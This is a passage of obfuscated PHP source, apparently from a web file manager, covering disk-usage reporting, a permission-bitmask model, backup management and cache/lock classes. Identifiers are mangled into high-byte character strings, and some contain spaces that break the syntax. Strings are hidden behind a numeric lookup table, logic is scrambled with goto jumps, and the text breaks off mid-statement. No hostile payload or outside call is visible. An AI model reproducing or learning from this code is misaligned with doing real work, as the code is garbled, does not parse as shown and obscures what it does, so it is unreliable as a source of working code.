$a˜İØò¤éÔ[2085] => (int) $bÙÁ†’Íôï[$a˜İØò¤éÔ[2082]] * 1024 * 1024 * 1024, $a˜İØò¤éÔ[2086] => (int) $BŒŠ™„ŒÑÈ, $a˜İØò¤éÔ[2087] => ucfirst($c†«ËÓç¤§), $a˜İØò¤éÔ[2088] => $a˜İØò¤éÔ[2089] . PHP_VERSION, $a˜İØò¤éÔ[2090] => phpBuild64() ? 64 : 32, $a˜İØò¤éÔ[689] => str_replace($a˜İØò¤éÔ[2091], $a˜İØò¤éÔ[894], $CôŒ·Ì°øÆ), $a˜İØò¤éÔ[348] => ucfirst($Aàğ¬Ë¾†Ó), $a˜İØò¤éÔ[38] => $_SERVER[$a˜İØò¤éÔ[2092]]); goto FŠÇç¸·©ä; FŠÇç¸·©ä: } private function diskDriver() { goto FÍøëß¹£˜; Bã„Ş–ï®©: if ($c«³ƒƒù¿ò) { $Bë©Ø³¡×Ò = $a…ö¨›İ[2095]; if (function_exists($a…ö¨›İ[2096])) { exec($a…ö¨›İ[2097], $b©çÃíÛé); $Bë©Ø³¡×Ò = $b©çÃíÛé[1] . $a…ö¨›İ[18]; } } if (!file_exists($Bë©Ø³¡×Ò)) { return; } $b½Ğİ­•›Ô = @disk_total_space($Bë©Ø³¡×Ò); goto EóÁ‹â©°; FÍøëß¹£˜: $a…ö¨›İ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bë©Ø³¡×Ò = $a…ö¨›İ[18]; $c«³ƒƒù¿ò = $GLOBALS[$a…ö¨›İ[16]][$a…ö¨›İ[2093]] == $a…ö¨›İ[2094]; goto Bã„Ş–ï®©; EóÁ‹â©°: $Bö£‰í©ÚÃ = $b½Ğİ­•›Ô - @disk_free_space($Bë©Ø³¡×Ò); return array($a…ö¨›İ[2082] => $b½Ğİ­•›Ô, $a…ö¨›İ[2084] => $Bö£‰í©ÚÃ); goto dÓçñìø; dÓçñìø: } public function fileChart($dÕÅñ»Ç’) { goto bùªŠãÊŠô; aãªÃÄµ×÷: $dºˆ±‰åØ = $this->sourceSize(); $A²¹µËëğà = array($aáÌİØ¥ñ[474] => 0, $aáÌİØ¥ñ[382] => 1); $D—ºÆ›‰Ÿ‡ = Model($aáÌİØ¥ñ[747])->where($A²¹µËëğà)->sum($aáÌİØ¥ñ[89]); goto fÃğªÌ°Ë; bùªŠãÊŠô: $aáÌİØ¥ñ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($dÕÅñ»Ç’[$aáÌİØ¥ñ[1427]])) { return Model($aáÌİØ¥ñ[747])->userFileTypeProfile($dÕÅñ»Ç’[$aáÌİØ¥ñ[1427]]); } if (isset($dÕÅñ»Ç’[$aáÌİØ¥ñ[2098]])) { return Model($aáÌİØ¥ñ[747])->groupFileTypeProfile($dÕÅñ»Ç’[$aáÌİØ¥ñ[2098]]); } goto aãªÃÄµ×÷; fÃğªÌ°Ë: $A²¹µËëğà[$aáÌİØ¥ñ[382]] = 2; $aÒŸô¹İ© = Model($aáÌİØ¥ñ[747])->where($A²¹µËëğà)->sum($aáÌİØ¥ñ[89]); return array($aáÌİØ¥ñ[693] => $dºˆ±‰åØ[$aáÌİØ¥ñ[89]], $aáÌİØ¥ñ[2028] => $dºˆ±‰åØ[$aáÌİØ¥ñ[2028]], $aáÌİØ¥ñ[2029] => (int) $D—ºÆ›‰Ÿ‡, $aáÌİØ¥ñ[2030] => (int) $aÒŸô¹İ©); goto F›Ú¥õ¿Ê; F›Ú¥õ¿Ê: } private function sourceSize() { $d²±ÓÀÂ¤… =& $_SERVER[¹÷ˆ§éÒ°ú]; $eìÙêì«°ê = Model($d²±ÓÀÂ¤…[747])->where(array($d²±ÓÀÂ¤…[381] => 0))->sum($d²±ÓÀÂ¤…[89]); $eĞÇÒ–º‚Ü = Model($d²±ÓÀÂ¤…[433])->sum($d²±ÓÀÂ¤…[89]); if ($eĞÇÒ–º‚Ü > $eìÙêì«°ê) { $eĞÇÒ–º‚Ü = $eìÙêì«°ê; } return array($d²±ÓÀÂ¤…[89] => (int) $eìÙêì«°ê, $d²±ÓÀÂ¤…[2028] => (int) $eĞÇÒ–º‚Ü); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $cî¦“Û‹ë¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; $E¡à—‚®¹î = array(array($cî¦“Û‹ë¯[397] => LNG($cî¦“Û‹ë¯[2099]), $cî¦“Û‹ë¯[2100] => $cî¦“Û‹ë¯[2101], $cî¦“Û‹ë¯[2102] => 6, $cî¦“Û‹ë¯[2103] => 1, $cî¦“Û‹ë¯[2104] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($cî¦“Û‹ë¯[397] => LNG($cî¦“Û‹ë¯[2105]), $cî¦“Û‹ë¯[2100] => $cî¦“Û‹ë¯[2106], $cî¦“Û‹ë¯[2102] => 1, $cî¦“Û‹ë¯[2103] => 1, $cî¦“Û‹ë¯[2104] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($cî¦“Û‹ë¯[397] => LNG($cî¦“Û‹ë¯[2107]), $cî¦“Û‹ë¯[2100] => $cî¦“Û‹ë¯[2108], $cî¦“Û‹ë¯[2102] => 2, $cî¦“Û‹ë¯[2103] => 1, $cî¦“Û‹ë¯[2104] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($cî¦“Û‹ë¯[397] => LNG($cî¦“Û‹ë¯[2109]), $cî¦“Û‹ë¯[2100] => $cî¦“Û‹ë¯[2108], $cî¦“Û‹ë¯[2102] => 3, $cî¦“Û‹ë¯[2103] => 1, $cî¦“Û‹ë¯[2104] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($cî¦“Û‹ë¯[397] => LNG($cî¦“Û‹ë¯[2110]), $cî¦“Û‹ë¯[2100] => $cî¦“Û‹ë¯[2111], $cî¦“Û‹ë¯[2102] => 4, $cî¦“Û‹ë¯[2103] => 1, $cî¦“Û‹ë¯[2104] => self::AUTH_SHOW | self::AUTH_VIEW), array($cî¦“Û‹ë¯[397] => LNG($cî¦“Û‹ë¯[2112]), $cî¦“Û‹ë¯[2100] => $cî¦“Û‹ë¯[2113], $cî¦“Û‹ë¯[2102] => 5, $cî¦“Û‹ë¯[2103] => 1, $cî¦“Û‹ë¯[2104] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($cî¦“Û‹ë¯[397] => LNG($cî¦“Û‹ë¯[2114]), $cî¦“Û‹ë¯[2100] => $cî¦“Û‹ë¯[2115], $cî¦“Û‹ë¯[2102] => 7, $cî¦“Û‹ë¯[2103] => 1, $cî¦“Û‹ë¯[2104] => 0)); return $E¡à—‚®¹î; } public static function authCheck($ašÔö×Š¤, $b—ó—íÔ„Ÿ) { $ašÔö×Š¤ = intval($ašÔö×Š¤); if (_get($GLOBALS, $_SERVER[¹÷ˆ§éÒ°ú][470])) { return !0; } if ($ašÔö×Š¤ <= 0) { return !1; } if (($ašÔö×Š¤ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ašÔö×Š¤ & $b—ó—íÔ„Ÿ); } public static function authCheckShow($aî¡È”Ü»®) { return self::authCheck($aî¡È”Ü»®, self::AUTH_SHOW); } public static function authCheckView($aùêˆÄÈº) { return self::authCheck($aùêˆÄÈº, self::AUTH_VIEW); } public static function authCheckDownload($CŸ¸š‡˜µÜ) { return self::authCheck($CŸ¸š‡˜µÜ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($dêµ¢ñ…Ï) { return self::authCheck($dêµ¢ñ…Ï, self::AUTH_UPLOAD); } public static function authCheckEdit($A£ñŒÆ§£İ) { return self::authCheck($A£ñŒÆ§£İ, self::AUTH_EDIT); } public static function authCheckRemove($e¸ÄÌ§Æ©ê) { return self::authCheck($e¸ÄÌ§Æ©ê, self::AUTH_REMOVE); } public static function authCheckShare($d¢‰¹í‚±¿) { return self::authCheck($d¢‰¹í‚±¿, self::AUTH_SHARE); } public static function authCheckComment($Dª©ÚÔ·¡) { return self::authCheck($Dª©ÚÔ·¡, self::AUTH_COMMENT); } public static function authCheckEvent($dŸöøİÅ½®) { return self::authCheck($dŸöøİÅ½®, self::AUTH_EVENT); } public static function authCheckRoot($E’¤®È–÷Å) { return self::authCheck($E’¤®È–÷Å, self::AUTH_ROOT); } public static function authDisable($DîŸ„ìˆëô, $BóÍÚˆØ) { if (intval($DîŸ„ìˆëô) <= 0) { return 0; } return intval($DîŸ„ìˆëô) & ~$BóÍÚˆØ; } public $optionType = "\x53\171\163\164\145\x6d\56\x73\x6f\x75\x72\x63\145\x41\165\x74\x68\114\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\141\165\164\150", "\154\x61\142\145\154", "\144\x69\163\160\x6c\141\x79", "\x73\x79\x73\164\x65\x6d", "\x73\157\162\x74"); public function initData() { $AŸÛ‰İ²» = $this->authDefault(); foreach ($AŸÛ‰İ²» as $f”’’Ô¾ÎÖ) { $this->add($f”’’Ô¾ÎÖ); } } public function listData($eß‘ÙõôÓ¸ = false, $cÃå—Ñ÷» = "\163\157\162\164", $A‡åÛº«Ó´ = false) { return parent::listData($eß‘ÙõôÓ¸, $cÃå—Ñ÷», $A‡åÛº«Ó´); } public function update($FÏÇù‰«¬, $C‡Ñˆîï©•) { $d—åŠ”‹‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; $f²£©Æí = parent::listData($FÏÇù‰«¬); $cù¹ô—Í‚ = $this->findByName($C‡Ñˆîï©•[$d—åŠ”‹‘[38]]); if (!$f²£©Æí || $cù¹ô—Í‚ && $cù¹ô—Í‚[$d—åŠ”‹‘[378]] != $f²£©Æí[$d—åŠ”‹‘[378]]) { return !1; } $this->filterAuth($C‡Ñˆîï©•[$d—åŠ”‹‘[387]]); return parent::update($FÏÇù‰«¬, $C‡Ñˆîï©•); } public function remove($D§Ë±»Å¢) { $C‘¯¾¡¡«® = parent::listData($D§Ë±»Å¢); if (!$C‘¯¾¡¡«® || $C‘¯¾¡¡«®[$_SERVER[¹÷ˆ§éÒ°ú][1071]]) { return !1; } return parent::remove($D§Ë±»Å¢); } public function add($aÆ´ãŞç© = array()) { goto b®Ãìœğš; Fšº¼çäˆ×: $aÆ´ãŞç© = array_merge($d‘‹õ·®Â, $aÆ´ãŞç©); $aÆ´ãŞç©[$E…Ã²õî©Î[2119]] = $this->getSort(); $this->filterAuth($aÆ´ãŞç©[$E…Ã²õî©Î[387]]); goto báåßÑ¡õ; báåßÑ¡õ: return parent::insert($aÆ´ãŞç©); goto bŸçœ«¡š; b®Ãìœğš: $E…Ã²õî©Î =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->findByName($aÆ´ãŞç©[$E…Ã²õî©Î[38]])) { return !1; } $d‘‹õ·®Â = array($E…Ã²õî©Î[38] => $E…Ã²õî©Î[43], $E…Ã²õî©Î[387] => 1, $E…Ã²õî©Î[2116] => $E…Ã²õî©Î[2117], $E…Ã²õî©Î[2118] => 1, $E…Ã²õî©Î[1071] => 0, $E…Ã²õî©Î[2119] => 0); goto Fšº¼çäˆ×; bŸçœ«¡š: } private function getSort() { $eÊ¼ÙÇêª  =& $_SERVER[¹÷ˆ§éÒ°ú]; $EĞá´Ö¿‡† = parent::listData(); $eÄ§¨ĞÉ›ë = array_to_keyvalue($EĞá´Ö¿‡†, $eÊ¼ÙÇêª [43], $eÊ¼ÙÇêª [2119]); return empty($eÄ§¨ĞÉ›ë) ? 0 : max($eÄ§¨ĞÉ›ë) + 1; } private function filterAuth(&$e­íºó¨œÎ) { goto eö¸ÔÕÓöÊ; A•îî¤Ïè­: foreach ($EÁ®§ÏŠï as $d—¼¹”÷¡Ã) { if ($e­íºó¨œÎ & $d—¼¹”÷¡Ã) { $f˜ã²î¤‡½[] = $d—¼¹”÷¡Ã; } } if (in_array(self::AUTH_ROOT, $f˜ã²î¤‡½)) { $e­íºó¨œÎ = array_sum($EÁ®§ÏŠï); return; } $CÍè•è‹  = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto fÈä‰±ĞÛ–; fÈä‰±ĞÛ–: foreach ($f˜ã²î¤‡½ as $d—¼¹”÷¡Ã) { if (isset($CÍè•è‹ [$d—¼¹”÷¡Ã])) { $f˜ã²î¤‡½ = array_merge($f˜ã²î¤‡½, $CÍè•è‹ [$d—¼¹”÷¡Ã]); } } $f˜ã²î¤‡½[] = self::AUTH_SHOW; $e­íºó¨œÎ = array_sum(array_unique($f˜ã²î¤‡½)); goto b¢¾´ÔÙ‚«; eö¸ÔÕÓöÊ: if (!$e­íºó¨œÎ) { return; } $EÁ®§ÏŠï = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $f˜ã²î¤‡½ = array(); goto A•îî¤Ïè­; b¢¾´ÔÙ‚«: } public function sort($D×É²ŸéĞë, $a­öŞ‡‰) { return parent::update($D×É²ŸéĞë, $a­öŞ‡‰); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\x62\141\143\x6b\165\160\x4c\x69\163\164"; public $field = array("\151\x6f", "\x6e\x61\x6d\x65", "\163\164\x61\164\x75\163", "\143\157\156\164\x65\x6e\x74", "\x72\x65\163\x75\x6c\164", "\164\x69\x6d\x65\106\x72\157\x6d", "\x74\151\x6d\145\124\157"); public function config() { goto FÅ‘ôÛªñ; CÆóÁ‘§ŸÙ: $B¯ë…ÇÕ¼õ = is_array($B¯ë…ÇÕ¼õ) ? $B¯ë…ÇÕ¼õ : array(); if (!isset($B¯ë…ÇÕ¼õ[$fÛÖŸ¶ÓÆí[687]])) { $B¯ë…ÇÕ¼õ[$fÛÖŸ¶ÓÆí[687]] = $fÛÖŸ¶ÓÆí[95]; } $e—“í½ë† = array(); goto B„ÃÛèÂÌŞ; FÅ‘ôÛªñ: $fÛÖŸ¶ÓÆí =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¯ë…ÇÕ¼õ = Model($fÛÖŸ¶ÓÆí[1079])->get($fÛÖŸ¶ÓÆí[708]); $B¯ë…ÇÕ¼õ = json_decode($B¯ë…ÇÕ¼õ, !0); goto CÆóÁ‘§ŸÙ; B„ÃÛèÂÌŞ: Action($fÛÖŸ¶ÓÆí[2120])->taskInit(); $dåê‡‹ùåä = Model($fÛÖŸ¶ÓÆí[2121])->listData(); foreach ($dåê‡‹ùåä as $a¡†¿îö³Î) { if ($a¡†¿îö³Î[$fÛÖŸ¶ÓÆí[1071]] == $fÛÖŸ¶ÓÆí[95] && $a¡†¿îö³Î[$fÛÖŸ¶ÓÆí[1415]] == $fÛÖŸ¶ÓÆí[2122]) { $e—“í½ë† = $a¡†¿îö³Î; break; } } goto FâĞĞ¤‰ç‡; FâĞĞ¤‰ç‡: if (isset($e—“í½ë†[$fÛÖŸ¶ÓÆí[202]])) { $e—“í½ë†[$fÛÖŸ¶ÓÆí[202]] = json_decode($e—“í½ë†[$fÛÖŸ¶ÓÆí[202]], !0); } if (isset($B¯ë…ÇÕ¼õ[$fÛÖŸ¶ÓÆí[202]])) { $e—“í½ë†[$fÛÖŸ¶ÓÆí[202]][$fÛÖŸ¶ÓÆí[1402]] = $B¯ë…ÇÕ¼õ[$fÛÖŸ¶ÓÆí[202]]; unset($B¯ë…ÇÕ¼õ[$fÛÖŸ¶ÓÆí[202]]); } return array_merge($e—“í½ë†, $B¯ë…ÇÕ¼õ); goto fçóÚéğ°Ş; fçóÚéğ°Ş: } public function listData($Aµ“½äÕ‡’ = false, $f’ßò×ğŒš = "\155\x6f\x64\x69\146\171\124\x69\x6d\145", $d™öÅâ›ï = false) { return parent::listData($Aµ“½äÕ‡’, $f’ßò×ğŒš, !0); } public function lastItem() { $a–»³Å±© = $this->listData(); return !empty($a–»³Å±©[0]) ? $a–»³Å±©[0] : null; } public function kill($c¶Í««Õ¿) { goto b†ÀÇš; d®Ô­±Š«: $f×½¦Âà¥É = $e«ùÉ©°Ş[$BÕ²Äˆ¶ª[38]]; $D›š™ğŠŒ• = TEMP_FILES . $BÕ²Äˆ¶ª[704] . $f×½¦Âà¥É . $BÕ²Äˆ¶ª[18]; IO::remove($D›š™ğŠŒ•, !1); goto Bù«»¬é´Ö; A¬¦Òö¨ì»: Task::kill($BÕ²Äˆ¶ª[707]); Task::kill($BÕ²Äˆ¶ª[723]); Task::kill($BÕ²Äˆ¶ª[731]); goto d®Ô­±Š«; Bù«»¬é´Ö: return $this->remove($c¶Í««Õ¿); goto fÛ¶¦°Ÿâİ; b†ÀÇš: $BÕ²Äˆ¶ª =& $_SERVER[¹÷ˆ§éÒ°ú]; $e«ùÉ©°Ş = $this->listData($c¶Í««Õ¿); if (!$e«ùÉ©°Ş || empty($e«ùÉ©°Ş[$BÕ²Äˆ¶ª[38]])) { return !0; } goto A¬¦Òö¨ì»; fÛ¶¦°Ÿâİ: } public function remove($a˜…ŞîÇÇ½) { $C©Í¶¬‹Óğ = $this->listData($a˜…ŞîÇÇ½); if (!$C©Í¶¬‹Óğ) { return !0; } return $this->backupRemove($C©Í¶¬‹Óğ); } private function backupRemove($f…×èÓã•²) { $CâÚ‰ùÜ =& $_SERVER[¹÷ˆ§éÒ°ú]; parent::remove($f…×èÓã•²[$CâÚ‰ùÜ[378]]); $E©ê‡æÈÜ§ = "\x7b\x69\x6f\x3a{$f…×èÓã•²[$CâÚ‰ùÜ[686]]}\x7d\57\144\x61\164\x61\x62\141\163\x65\x2f\142\141\x63\153\x75\160\137" . $f…×èÓã•²[$CâÚ‰ùÜ[38]]; IO::remove($E©ê‡æÈÜ§, !1); return !0; } public function start() { goto cÔ»…à˜¼õ; añ×Ø‘ÃÛÊ: $A¶¯ŠÇØé = new Backup(); $A¶¯ŠÇØé->keep(); if (!$A¶¯ŠÇØé->db()) { return !1; } goto a¿ç«±ğ‡¨; cÔ»…à˜¼õ: $Bï‘Í‰İ†¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($GLOBALS[$Bï‘Í‰İ†¦[16]][$Bï‘Í‰İ†¦[96]][$Bï‘Í‰İ†¦[2123]] != $Bï‘Í‰İ†¦[95]) { return !0; } $dÀ¥Ï»Ãç = $this->config(); goto D´ØŸº§è™; a¿ç«±ğ‡¨: if (!$A¶¯ŠÇØé->dbFile()) { return !1; } if ($dÀ¥Ï»Ãç[$Bï‘Í‰İ†¦[687]] == $Bï‘Í‰İ†¦[481]) { $A¶¯ŠÇØé->file(); } Backup::set(array($Bï‘Í‰İ†¦[684] => 1, $Bï‘Í‰İ†¦[460] => time())); goto eã‡ÔÅÄŞæ; D´ØŸº§è™: if (!$dÀ¥Ï»Ãç || $dÀ¥Ï»Ãç[$Bï‘Í‰İ†¦[1399]] != $Bï‘Í‰İ†¦[95]) { return !1; } $D‹øõ—ã™ = $this->process(); foreach ($D‹øõ—ã™ as $fë£œ‡ï) { if ($fë£œ‡ï) { return Task::restart($fë£œ‡ï[$Bï‘Í‰İ†¦[378]]); } } goto añ×Ø‘ÃÛÊ; eã‡ÔÅÄŞæ: return !0; goto f¤Ç¹®µğô; f¤Ç¹®µğô: } public function process() { $AÚæí“§ã =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($AÚæí“§ã[689] => Task::get($AÚæí“§ã[707]), $AÚæí“§ã[692] => Task::get($AÚæí“§ã[723]), $AÚæí“§ã[179] => Task::get($AÚæí“§ã[731])); } public function restore() { $dÜ•ÏææŒÉ =& $_SERVER[¹÷ˆ§éÒ°ú]; ActionCall($dÜ•ÏææŒÉ[964], !0, 1); ActionCall($dÜ•ÏææŒÉ[964], !0, 0); } } goto D™ÛÉå¯ô; dÃ°ù—ÌƒÛ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($F¤İ±İ‚ëã, $C÷«ÍÊŒãÖ) { $bÔÚÛÏÅ› =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->cachePath = $F¤İ±İ‚ëã[$bÔÚÛÏÅ›[87]]; $this->prefix = $bÔÚÛÏÅ›[756]; $this->cacheTime = $C÷«ÍÊŒãÖ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($AÆ›Â†ŞÌ›) { $B…ñ·ç¨À =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÆ›Â†ŞÌ› = str_replace(array($B…ñ·ç¨À[757], $B…ñ·ç¨À[105], $B…ñ·ç¨À[81]), $B…ñ·ç¨À[758], $AÆ›Â†ŞÌ›); return $this->cachePath . $B…ñ·ç¨À[759] . $AÆ›Â†ŞÌ› . $B…ñ·ç¨À[760]; } public function set($a±ò‚ôŞÉ, $Bğ”íÕÌ‚, $e„ÂÍÙóÖ = false) { $D÷÷÷‘÷ë = $this->getFile($a±ò‚ôŞÉ); if (file_put_contents($D÷÷÷‘÷ë, $this->prefix . $Bğ”íÕÌ‚, LOCK_EX)) { return !0; } @unlink($D÷÷÷‘÷ë); return !1; } public function get($E¨ß†¬àÌ) { $A£õ´Æ’œ = $this->getFile($E¨ß†¬àÌ); if (file_exists($A£õ´Æ’œ) && filemtime($A£õ´Æ’œ) < time() - $this->cacheTime) { @unlink($A£õ´Æ’œ); return !1; } $B’ëÖ“öæµ = @file_get_contents($A£õ´Æ’œ); return substr($B’ëÖ“öæµ, strlen($this->prefix)); } public function remove($bñïÈ’À†Ù) { $c¶…ÏÂ¡ìİ = $this->getFile($bñïÈ’À†Ù); return @unlink($c¶…ÏÂ¡ìİ); } public function deleteAll() { $FƒÌ¢•ˆ¿ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cø·‹¡‹¬ó = scandir($this->cachePath); foreach ($cø·‹¡‹¬ó as $bŒËùŞ£²ë) { $B‡«æÁéê¸ = $this->cachePath . $bŒËùŞ£²ë; if (strpos($B‡«æÁéê¸, $FƒÌ¢•ˆ¿[760]) && strpos($B‡«æÁéê¸, $FƒÌ¢•ˆ¿[761])) { @unlink($B‡«æÁéê¸); } } } public function clearTimeout() { $c‡é¼ŸÏÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e±Ù‘³ª¢Ê = scandir($this->cachePath); foreach ($e±Ù‘³ª¢Ê as $Bô³‚íßïé) { $BË÷¬õÖÜ = $this->cachePath . $Bô³‚íßïé; if (strpos($BË÷¬õÖÜ, $c‡é¼ŸÏÊ[760]) && strpos($BË÷¬õÖÜ, $c‡é¼ŸÏÊ[761]) && filemtime($BË÷¬õÖÜ) < time() - $this->cacheTime) { @unlink($BË÷¬õÖÜ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto aÂ¿¤Èá†‰; a‹ñµ÷æ©: if ($eÓÂ¨İ‡¸å == $d¬ßáÉ¥Ÿ†[27] && $fù¿“‡Ä¢Ï == $d¬ßáÉ¥Ÿ†[19]) { $eÓÂ¨İ‡¸å = $d¬ßáÉ¥Ÿ†[179]; } switch ($eÓÂ¨İ‡¸å) { case $d¬ßáÉ¥Ÿ†[752]: self::$handle = new CacheLockRedis(); break; case $d¬ßáÉ¥Ÿ†[753]: self::$handle = new CacheLockMemcached(); break; case $d¬ßáÉ¥Ÿ†[27]: self::$handle = new CacheLockDatabase(); break; case $d¬ßáÉ¥Ÿ†[179]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto EÚÌ½æ«¨Ô; b˜›ó’®Íƒ: self::$timeout = $cŠ÷‘óŒ’À[$d¬ßáÉ¥Ÿ†[762]] ? $cŠ÷‘óŒ’À[$d¬ßáÉ¥Ÿ†[762]] : 10; $fù¿“‡Ä¢Ï = _get($GLOBALS[$d¬ßáÉ¥Ÿ†[16]], $d¬ßáÉ¥Ÿ†[763]); $eÓÂ¨İ‡¸å = $cŠ÷‘óŒ’À[$d¬ßáÉ¥Ÿ†[749]] ? $cŠ÷‘óŒ’À[$d¬ßáÉ¥Ÿ†[749]] : $d¬ßáÉ¥Ÿ†[179]; goto a‹ñµ÷æ©; aÂ¿¤Èá†‰: $d¬ßáÉ¥Ÿ† =& $_SERVER[¹÷ˆ§éÒ°ú]; if (self::$handle) { return self::$handle; } $cŠ÷‘óŒ’À = $GLOBALS[$d¬ßáÉ¥Ÿ†[16]][$d¬ßáÉ¥Ÿ†[348]]; goto b˜›ó’®Íƒ; EÚÌ½æ«¨Ô: } private static function key($c®‚ÉÑî÷¹) { return $_SERVER[¹÷ˆ§éÒ°ú][764] . Cache::key($c®‚ÉÑî÷¹); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($cµĞª¨æÑ© = '') { self::$errorMsg = $cµĞª¨æÑ©; } public static function lockGlobal($d¦¡÷, $c†ÁøÉç–‡) { return self::lock($d¦¡÷, $c†ÁøÉç–‡, !0); } public static function lock($E†œµíå¥ã, $BÄÈßÑ˜ÅÈ = false, $FÛÄ± ¤‹ = false) { goto e‚ãÊ‘ìÏŒ; b•Š…éƒœé: $BÄÈßÑ˜ÅÈ = $BÄÈßÑ˜ÅÈ ? $BÄÈßÑ˜ÅÈ : self::$timeout; $f­×šˆƒ®¿ = $Aªƒ”Å‘à‚->lock($C™‚èå®å, $BÄÈßÑ˜ÅÈ); if (!$f­×šˆƒ®¿) { $bÖ«´õëƒ = $eï÷»ã†×Š[765] . $BÄÈßÑ˜ÅÈ . $eï÷»ã†×Š[79] . self::$errorMsg . $eï÷»ã†×Š[79] . get_caller_msg(); $d¯Éá’ôƒœ = "\114\157\x63\x6b\x20\141\143\x74\x69\x6f\156\x3a\x20{$C™‚èå®å}\40\x74\151\155\x65\x6f\165\164\54\x6f\166\x65\162\40{$BÄÈßÑ˜ÅÈ}\x20\x73"; $d¯Éá’ôƒœ = self::$errorMsg ? self::$errorMsg : $Bß‡Ê í­„; write_log($bÖ«´õëƒ, $eï÷»ã†×Š[766]); show_json($d¯Éá’ôƒœ, !1); } goto D æÒØÇÏğ; D æÒØÇÏğ: if (!$FÛÄ± ¤‹) { self::$lockItem[$C™‚èå®å] = !0; } return $f­×šˆƒ®¿; goto DÆ¨äÄÊ…; e‚ãÊ‘ìÏŒ: $eï÷»ã†×Š =& $_SERVER[¹÷ˆ§éÒ°ú]; $Aªƒ”Å‘à‚ = self::init(); $C™‚èå®å = self::key($E†œµíå¥ã); goto b•Š…éƒœé; DÆ¨äÄÊ…: } public static function lockGet($F—®”Ğµùå) { $fó˜™®îÃ = self::key($F—®”Ğµùå); if (self::$lockItem[$fó˜™®îÃ]) { return self::$lockItem[$fó˜™®îÃ]; } return self::init()->lockGet($fó˜™®îÃ); } public static function unlock($féÏÛ±Íô›) { $e…†àâÊÄ = self::key($féÏÛ±Íô›); self::$lockItem[$e…†àâÊÄ] = null; return self::init()->unlock($e…†àâÊÄ); } public static function unlockRuntime() { $D„œ¦‡†¬ó =& $_SERVER[¹÷ˆ§éÒ°ú]; $F¬ê¬Ô•‡¡ = self::init(); $AÇ±Ç¼šÈ = !1; foreach (self::$lockItem as $D«Šæ’Â¦ƒ => $fêå»›ãØŞ) { if (!$fêå»›ãØŞ) { continue; } $F¬ê¬Ô•‡¡->unlock($D«Šæ’Â¦ƒ); if (!$AÇ±Ç¼šÈ) { $AÇ±Ç¼šÈ = !0; write_log($D„œ¦‡†¬ó[767] . $D«Šæ’Â¦ƒ . $D„œ¦‡†¬ó[79] . get_caller_msg(), $D„œ¦‡†¬ó[766]); continue; } write_log($D„œ¦‡†¬ó[767] . $D«Šæ’Â¦ƒ, $D„œ¦‡†¬ó[766]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto f–ğ™†¼½; e‹¢¦‰ö»: function beforeShutdownFatalError($Dõá Ûğùœ) { think_exception($Dõá Ûğùœ); } $_SERVER[$_SERVER[Œá²][45]] = $f¤Ì–¶‡¶($_SERVER[$_SERVER[Œá²][42]]); $Fö®Ëò’šÏ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto d„Ñ–ÚåîÕ; bàî¯·„À: class CacheLockDatabase { public function lock($c‰…Ó‚†, $EÁïÛôÙÅ’ = 0) { $F…†¬ŠŠî = Model($_SERVER[¹÷ˆ§éÒ°ú][751]); $bïÖíßÜÃ = microtime(!0) + $EÁïÛôÙÅ’; while (microtime(!0) < $bïÖíßÜÃ) { $AÔ¦ñ£á‚ = $F…†¬ŠŠî->get($c‰…Ó‚†); if (!$AÔ¦ñ£á‚ || $AÔ¦ñ£á‚ < microtime(!0)) { $B•¹«¿’à‡ = $F…†¬ŠŠî->set($c‰…Ó‚†, $bïÖíßÜÃ); if ($B•¹«¿’à‡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($D 